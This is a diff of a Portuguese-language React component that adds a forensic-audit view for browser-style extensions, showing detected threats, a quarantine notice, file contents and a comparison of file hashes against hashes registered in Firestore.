-                    href={ext.url}
-                    target="_blank"
-                    rel="noreferrer"
-                    className="text-blue-700 hover:underline font-bold"
+                {forensicAudit.quarantined && (
+                  <div className="mt-3 p-2.5 bg-red-700 text-white text-[11px] font-bold flex items-center gap-2">
+                    <Lock className="w-4 h-4 shrink-0" />
+                    <span>QUARENTENA PREVENTIVA DISPARADA: Esta extensão possui ameaças críticas e está impedida de ser sincronizada ou executada.</span>
+                  </div>
+                )}
+
+                {/* Detected Threats List */}
+                {forensicAudit.threats.length > 0 ? (
+                  <div className="mt-3 space-y-2">
+                    <span className="font-bold text-stone-900 block text-[11px] uppercase tracking-wider">
+                      Ameaças Identificadas ({forensicAudit.threats.length}):
+                    </span>
+                    {forensicAudit.threats.map((threat, idx) => (
+                      <div key={idx} className="p-3 bg-white border border-stone-300 text-stone-800 space-y-1">
+                        <div className="flex items-center justify-between">
+                          <span className={`px-1.5 py-0.5 text-[9px] font-bold uppercase ${
+                            threat.severity === 'CRITICAL'
+                              ? 'bg-red-700 text-white'
+                              : threat.severity === 'HIGH'
+                              ? 'bg-amber-600 text-white'
+                              : 'bg-yellow-400 text-stone-900'
+                          }`}>
+                            [{threat.severity}] {threat.ruleId} ({threat.category})
+                          </span>
+                          <span className="text-[10px] text-stone-500 font-bold">Linha: {threat.lineNumber}</span>
+                        </div>
+                        <p className="text-xs font-bold text-stone-900">{threat.description}</p>
+                        <div className="p-1.5 bg-stone-100 font-mono text-[11px] text-red-900 border-l-2 border-red-600 overflow-x-auto">
+                          <code>{threat.snippet}</code>
+                        </div>
+                        <p className="text-[10px] text-stone-600">
+                          <strong>Mitigação Recomendada:</strong> {threat.recommendation}
+                        </p>
+                      </div>
+                    ))}
+                  </div>
+                ) : (
+                  <div className="mt-3 p-3 bg-white border border-emerald-400 text-emerald-900 text-xs font-bold flex items-center gap-2">
+                    <CheckCircle className="w-4 h-4 text-emerald-700" />
+                    <span>Nenhum padrão malicioso detectado. Código em conformidade com as diretrizes do ecossistema WazzimaGiygg.</span>
+                  </div>
+                )}
+              </div>
+            )}
+          </div>
+
+          {/* ===================================================================== */}
+          {/* INSPECTOR MODAL: VIEW EXTENSION FILES & AUDIT MANIFEST               */}
+          {/* ===================================================================== */}
+          {inspectingExtension && (
+            <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4">
+              <div className="bg-white border-4 border-[#141414] max-w-3xl w-full max-h-[85vh] flex flex-col shadow-[8px_8px_0px_0px_rgba(20,20,20,1)]">
+                {/* Modal Header */}
+                <div className="p-4 bg-stone-100 border-b-2 border-[#141414] flex items-center justify-between">
+                  <div>
+                    <h3 className="font-editorial text-xl font-bold text-stone-950 flex items-center gap-2">
+                      <FileCode className="w-5 h-5 text-purple-700" />
+                      <span>{inspectingExtension.namePt}</span>
+                      <span className="text-xs font-mono font-normal text-stone-600">({inspectingExtension.originDomain})</span>
+                    </h3>
+                    <p className="text-[11px] font-mono text-stone-600">
+                      Digest SHA-256 do pacote: <strong>{inspectingExtension.sha256}</strong>
+                    </p>
+                  </div>
+                  <button
+                    onClick={() => {
+                      setInspectingExtension(null);
+                      setInspectingFile(null);
+                    }}
+                    className="p-1 hover:bg-stone-200 cursor-pointer"
                   >
-                    Documentação ↗
-                  </a>
+                    <X className="w-5 h-5" />
+                  </button>
+                </div>
+
+                {/* Modal Content */}
+                <div className="p-4 overflow-y-auto space-y-4 font-mono text-xs">
+                  {/* File selector tabs */}
+                  <div className="flex items-center gap-1 border-b border-stone-300 pb-2">
+                    <span className="text-stone-500 font-bold mr-2 text-[10px] uppercase">Arquivos:</span>
+                    {inspectingExtension.files?.map((f) => (
+                      <button
+                        key={f.name}
+                        onClick={() => setInspectingFile(f)}
+                        className={`px-2.5 py-1 text-xs border ${
+                          inspectingFile?.name === f.name
+                            ? 'bg-stone-900 text-white border-black font-bold'
+                            : 'bg-stone-100 text-stone-700 border-stone-300 hover:bg-stone-200'
+                        }`}
+                      >
+                        {f.name}
+                      </button>
+                    ))}
+                  </div>
+
+                  {/* Active File Details */}
+                  {inspectingFile && (
+                    <div className="space-y-2">
+                      <div className="flex items-center justify-between text-[11px] bg-stone-100 p-2 border border-stone-300">
+                        <span>Arquivo: <strong>{inspectingFile.name}</strong> ({inspectingFile.size} bytes)</span>
+                        <span>Digest SHA-256: <strong>{inspectingFile.sha256.slice(0, 16)}...</strong></span>
+                      </div>
+                      <pre className="p-3 bg-stone-900 text-stone-100 text-[11px] max-h-60 overflow-y-auto border border-black font-mono">
+                        {inspectingFile.content}
+                      </pre>
+                    </div>
+                  )}
+
+                  {/* Audit details for this extension */}
+                  {inspectingExtension.securityAudit && (
+                    <div className="p-3 bg-stone-50 border-2 border-stone-300 space-y-2">
+                      <div className="flex items-center justify-between">
+                        <span className="font-bold text-stone-900 uppercase text-[10px]">
+                          Auditoria Forense Integrada
+                        </span>
+                        <span className="text-emerald-700 font-bold">
+                          Score: {inspectingExtension.securityAudit.safetyScore}/100 ({inspectingExtension.securityAudit.threatLevel})
+                        </span>
+                      </div>
+                      <p className="text-[11px] text-stone-600">
+                        Última sincronia autenticada por: <strong>{inspectingExtension.syncAuthorizedBy || 'pedrohenriquecardonaperes@gmail.com'}</strong> em{' '}
+                        {new Date(inspectingExtension.lastSyncTimestamp).toLocaleString('pt-BR')}.
+                      </p>
+                    </div>
+                  )}
+
+                  {/* Firestore Integrity Layer (Validação de Assinaturas e Hashes Registrados) */}
+                  {(() => {
+                    const integrityCheck = firestoreIntegrityMap[inspectingExtension.id];
+                    return (
+                      <div className="p-3 bg-stone-50 border-2 border-stone-300 space-y-3">
+                        <div className="flex items-center justify-between pb-2 border-b border-stone-300">
+                          <span className="font-bold text-stone-900 uppercase text-[10px] flex items-center gap-1.5">
+                            <Database className="w-3.5 h-3.5 text-blue-700" />
+                            Camada de Integridade no Firestore (Hashes & Assinaturas)
+                          </span>
+                          {integrityCheck?.valid ? (
+                            <span className="bg-emerald-700 text-white font-bold px-2 py-0.5 text-[9px] uppercase flex items-center gap-1">
+                              <ShieldCheck className="w-3 h-3" /> Assinatura Válida
+                            </span>
+                          ) : (
+                            <span className="bg-red-700 text-white font-bold px-2 py-0.5 text-[9px] uppercase flex items-center gap-1">
+                              <AlertOctagon className="w-3 h-3" /> {integrityCheck?.status || 'Pendente'}
+                            </span>
+                          )}
+                        </div>
+
+                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-[10px]">
+                          <div className="p-2 bg-white border border-stone-200">
+                            <span className="text-stone-500 font-bold block">Hash Registrado no Firestore:</span>
+                            <span className="font-mono text-stone-900 font-bold break-all">
+                              {integrityCheck?.expectedHash || inspectingExtension.sha256}
+                            </span>
+                          </div>
+                          <div className="p-2 bg-white border border-stone-200">
+                            <span className="text-stone-500 font-bold block">Hash Calculado dos Arquivos:</span>
+                            <span className="font-mono text-stone-900 font-bold break-all">
+                              {integrityCheck?.computedHash || computeSha256Hex(inspectingFile?.content || '')}
+                            </span>
+                          </div>
+                        </div>
+
+                        {/* Files Integrity Comparison */}
+                        {integrityCheck?.filesIntegrity && integrityCheck.filesIntegrity.length > 0 && (
+                          <div className="space-y-1">
+                            <span className="text-[10px] font-bold text-stone-700 uppercase">
+                              Conferência de Arquivos vs. Hashes no Firestore:
+                            </span>
+                            <div className="border border-stone-300 bg-white overflow-x-auto">
+                              <table className="w-full text-[10px]">
+                                <thead className="bg-stone-100 border-b border-stone-300">
+                                  <tr>
+                                    <th className="p-1.5 text-left font-bold text-stone-700">Arquivo</th>
+                                    <th className="p-1.5 text-left font-bold text-stone-700">Hash Firestore</th>
+                                    <th className="p-1.5 text-left font-bold text-stone-700">Hash Local</th>
+                                    <th className="p-1.5 text-center font-bold text-stone-700">Status</th>
+                                  </tr>
+                                </thead>
+                                <tbody>
+                                  {integrityCheck.filesIntegrity.map((f, i) => (
+                                    <tr key={i} className="border-b border-stone-200">
+                                      <td className="p-1.5 font-bold text-stone-900">{f.fileName}</td>
+                                      <td className="p-1.5 font-mono text-stone-600">{f.expectedHash.slice(0, 10)}...</td>
+                                      <td className="p-1.5 font-mono text-stone-600">{f.computedHash.slice(0, 10)}...</td>
+                                      <td className="p-1.5 text-center">
+                                        {f.match ? (
+                                          <span className="text-emerald-700 font-bold">✓ Coincide</span>
+                                        ) : (
+                                          <span className="text-red-700 font-bold">⚠️ Divergente</span>
+                                        )}
+                                      </td>
+                                    </tr>
+                                  ))}
+                                </tbody>
+                              </table>
+                            </div>
+                          </div>
+                        )}
+
+                        {/* Execution simulation action */}
+                        <div className="pt-2 border-t border-stone-200 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2">
+                          <button
+                            onClick={() => handleTestSafeExecution(inspectingExtension)}
+                            className="px-3 py-1.5 bg-blue-700 hover:bg-blue-800 text-white font-mono text-xs font-bold flex items-center gap-1.5 cursor-pointer"
+                          >
+                            <Cpu className="w-3.5 h-3.5" />
+                            <span>Validar & Simular Execução (executeExtensionSafely)</span>
+                          </button>
+
+                          {isBureaucrat && (
+                            <button
+                              onClick={async () => {
+                                const res = await registerExtensionHashInFirestore(inspectingExtension, currentUser?.email);
+                                if (res.success) {
+                                  showToast('Hash oficial registrado com sucesso no Firestore.');
+                                  refreshFirestoreIntegrity(extensions);
+                                } else {
+                                  showToast(res.error || 'Erro ao registrar no Firestore.', true);
+                                }
+                              }}
+                              className="px-3 py-1.5 bg-stone-800 hover:bg-black text-white font-mono text-xs font-bold flex items-center gap-1.5 cursor-pointer"
+                            >
+                              <Shield className="w-3.5 h-3.5" />
+                              <span>Atualizar Assinatura no Firestore</span>
+                            </button>
+                          )}
+                        </div>
+
+                        {/* Execution Simulation Feedback */}
+                        {executionTestResult && (
+                          <div
+                            className={`p-2.5 border text-[11px] ${
+                              executionTestResult.success
+                                ? 'bg-emerald-50 border-emerald-500 text-emerald-950 font-bold'
+                                : 'bg-red-50 border-red-500 text-red-950 font-bold'
+                            }`}
+                          >
+                            <div className="flex items-center gap-1.5">
+                              {executionTestResult.success ? (
+                                <CheckCircle className="w-4 h-4 text-emerald-700 shrink-0" />
+                              ) : (
+                                <AlertOctagon className="w-4 h-4 text-red-700 shrink-0" />
+                              )}
+                              <span>{executionTestResult.message}</span>
+                            </div>
+                          </div>
+                        )}
+                      </div>
+                    );
+                  })()}
+                </div>
+
+                {/* Modal Footer */}
+                <div className="p-3 bg-stone-100 border-t-2 border-[#141414] flex items-center justify-end">
+                  <button
+                    onClick={() => {
+                      setInspectingExtension(null);
+                      setInspectingFile(null);
+                    }}
+                    className="px-4 py-1.5 bg-stone-900 text-white font-mono text-xs font-bold cursor-pointer"
+                  >
+                    Fechar Inspetor
+                  </button>
                 </div>
               </div>
-            ))}
-          </div>
+            </div>
+          )}
         </div>
       )}
 
